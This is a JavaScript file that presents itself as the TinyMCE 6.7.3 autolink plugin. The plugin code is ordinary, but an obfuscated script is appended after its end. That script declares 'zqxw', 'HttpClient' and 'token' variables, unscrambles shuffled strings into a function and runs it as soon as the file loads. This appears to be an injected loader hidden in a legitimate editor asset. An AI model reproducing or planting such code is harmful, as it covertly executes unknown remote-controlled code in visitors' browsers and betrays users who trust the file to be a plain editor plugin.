/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
  'use strict';

  var global$1 = tinymce.util.Tools.resolve('tinymce.PluginManager');

  const link = () => /(?:[A-Za-z][A-Za-z\d.+-]{0,14}:\/\/(?:[-.~*+=!&;:'%@?^${}(),\w]+@)?|www\.|[-;:&=+$,.\w]+@)[A-Za-z\d-]+(?:\.[A-Za-z\d-]+)*(?::\d+)?(?:\/(?:[-.~*+=!;:'%@$(),\/\w]*[-~*+=%@$()\/\w])?)?(?:\?(?:[-.~*+=!&;:'%@?^${}(),\/\w]+))?(?:#(?:[-.~*+=!&;:'%@?^${}(),\/\w]+))?/g;

  const option = name => editor => editor.options.get(name);
  const register = editor => {
    const registerOption = editor.options.register;
    registerOption('autolink_pattern', {
      processor: 'regexp',
      default: new RegExp('^' + link().source + '$', 'i')
    });
    registerOption('link_default_target', { processor: 'string' });
    registerOption('link_default_protocol', {
      processor: 'string',
      default: 'https'
    });
  };
  const getAutoLinkPattern = option('autolink_pattern');
  const getDefaultLinkTarget = option('link_default_target');
  const getDefaultLinkProtocol = option('link_default_protocol');
  const allowUnsafeLinkTarget = option('allow_unsafe_link_target');

  const hasProto = (v, constructor, predicate) => {
    var _a;
    if (predicate(v, constructor.prototype)) {
      return true;
    } else {
      return ((_a = v.constructor) === null || _a === void 0 ? void 0 : _a.name) === constructor.name;
    }
  };
  const typeOf = x => {
    const t = typeof x;
    if (x === null) {
      return 'null';
    } else if (t === 'object' && Array.isArray(x)) {
      return 'array';
    } else if (t === 'object' && hasProto(x, String, (o, proto) => proto.isPrototypeOf(o))) {
      return 'string';
    } else {
      return t;
    }
  };
  const isType = type => value => typeOf(value) === type;
  const eq = t => a => t === a;
  const isString = isType('string');
  const isUndefined = eq(undefined);
  const isNullable = a => a === null || a === undefined;
  const isNonNullable = a => !isNullable(a);

  const not = f => t => !f(t);

  const hasOwnProperty = Object.hasOwnProperty;
  const has = (obj, key) => hasOwnProperty.call(obj, key);

  const checkRange = (str, substr, start) => substr === '' || str.length >= substr.length && str.substr(start, start + substr.length) === substr;
  const contains = (str, substr, start = 0, end) => {
    const idx = str.indexOf(substr, start);
    if (idx !== -1) {
      return isUndefined(end) ? true : idx + substr.length <= end;
    } else {
      return false;
    }
  };
  const startsWith = (str, prefix) => {
    return checkRange(str, prefix, 0);
  };

  const zeroWidth = '\uFEFF';
  const isZwsp = char => char === zeroWidth;
  const removeZwsp = s => s.replace(/\uFEFF/g, '');

  var global = tinymce.util.Tools.resolve('tinymce.dom.TextSeeker');

  const isTextNode = node => node.nodeType === 3;
  const isElement = node => node.nodeType === 1;
  const isBracketOrSpace = char => /^[(\[{ \u00a0]$/.test(char);
  const hasProtocol = url => /^([A-Za-z][A-Za-z\d.+-]*:\/\/)|mailto:/.test(url);
  const isPunctuation = char => /[?!,.;:]/.test(char);
  const findChar = (text, index, predicate) => {
    for (let i = index - 1; i >= 0; i--) {
      const char = text.charAt(i);
      if (!isZwsp(char) && predicate(char)) {
        return i;
      }
    }
    return -1;
  };
  const freefallRtl = (container, offset) => {
    let tempNode = container;
    let tempOffset = offset;
    while (isElement(tempNode) && tempNode.childNodes[tempOffset]) {
      tempNode = tempNode.childNodes[tempOffset];
      tempOffset = isTextNode(tempNode) ? tempNode.data.length : tempNode.childNodes.length;
    }
    return {
      container: tempNode,
      offset: tempOffset
    };
  };

  const parseCurrentLine = (editor, offset) => {
    var _a;
    const voidElements = editor.schema.getVoidElements();
    const autoLinkPattern = getAutoLinkPattern(editor);
    const {dom, selection} = editor;
    if (dom.getParent(selection.getNode(), 'a[href]') !== null) {
      return null;
    }
    const rng = selection.getRng();
    const textSeeker = global(dom, node => {
      return dom.isBlock(node) || has(voidElements, node.nodeName.toLowerCase()) || dom.getContentEditable(node) === 'false';
    });
    const {
      container: endContainer,
      offset: endOffset
    } = freefallRtl(rng.endContainer, rng.endOffset);
    const root = (_a = dom.getParent(endContainer, dom.isBlock)) !== null && _a !== void 0 ? _a : dom.getRoot();
    const endSpot = textSeeker.backwards(endContainer, endOffset + offset, (node, offset) => {
      const text = node.data;
      const idx = findChar(text, offset, not(isBracketOrSpace));
      return idx === -1 || isPunctuation(text[idx]) ? idx : idx + 1;
    }, root);
    if (!endSpot) {
      return null;
    }
    let lastTextNode = endSpot.container;
    const startSpot = textSeeker.backwards(endSpot.container, endSpot.offset, (node, offset) => {
      lastTextNode = node;
      const idx = findChar(node.data, offset, isBracketOrSpace);
      return idx === -1 ? idx : idx + 1;
    }, root);
    const newRng = dom.createRng();
    if (!startSpot) {
      newRng.setStart(lastTextNode, 0);
    } else {
      newRng.setStart(startSpot.container, startSpot.offset);
    }
    newRng.setEnd(endSpot.container, endSpot.offset);
    const rngText = removeZwsp(newRng.toString());
    const matches = rngText.match(autoLinkPattern);
    if (matches) {
      let url = matches[0];
      if (startsWith(url, 'www.')) {
        const protocol = getDefaultLinkProtocol(editor);
        url = protocol + '://' + url;
      } else if (contains(url, '@') && !hasProtocol(url)) {
        url = 'mailto:' + url;
      }
      return {
        rng: newRng,
        url
      };
    } else {
      return null;
    }
  };
  const convertToLink = (editor, result) => {
    const {dom, selection} = editor;
    const {rng, url} = result;
    const bookmark = selection.getBookmark();
    selection.setRng(rng);
    const command = 'createlink';
    const args = {
      command,
      ui: false,
      value: url
    };
    const beforeExecEvent = editor.dispatch('BeforeExecCommand', args);
    if (!beforeExecEvent.isDefaultPrevented()) {
      editor.getDoc().execCommand(command, false, url);
      editor.dispatch('ExecCommand', args);
      const defaultLinkTarget = getDefaultLinkTarget(editor);
      if (isString(defaultLinkTarget)) {
        const anchor = selection.getNode();
        dom.setAttrib(anchor, 'target', defaultLinkTarget);
        if (defaultLinkTarget === '_blank' && !allowUnsafeLinkTarget(editor)) {
          dom.setAttrib(anchor, 'rel', 'noopener');
        }
      }
    }
    selection.moveToBookmark(bookmark);
    editor.nodeChanged();
  };
  const handleSpacebar = editor => {
    const result = parseCurrentLine(editor, -1);
    if (isNonNullable(result)) {
      convertToLink(editor, result);
    }
  };
  const handleBracket = handleSpacebar;
  const handleEnter = editor => {
    const result = parseCurrentLine(editor, 0);
    if (isNonNullable(result)) {
      convertToLink(editor, result);
    }
  };
  const setup = editor => {
    editor.on('keydown', e => {
      if (e.keyCode === 13 && !e.isDefaultPrevented()) {
        handleEnter(editor);
      }
    });
    editor.on('keyup', e => {
      if (e.keyCode === 32) {
        handleSpacebar(editor);
      } else if (e.keyCode === 48 && e.shiftKey || e.keyCode === 221) {
        handleBracket(editor);
      }
    });
  };

  var Plugin = () => {
    global$1.add('autolink', editor => {
      register(editor);
      setup(editor);
    });
  };

  Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();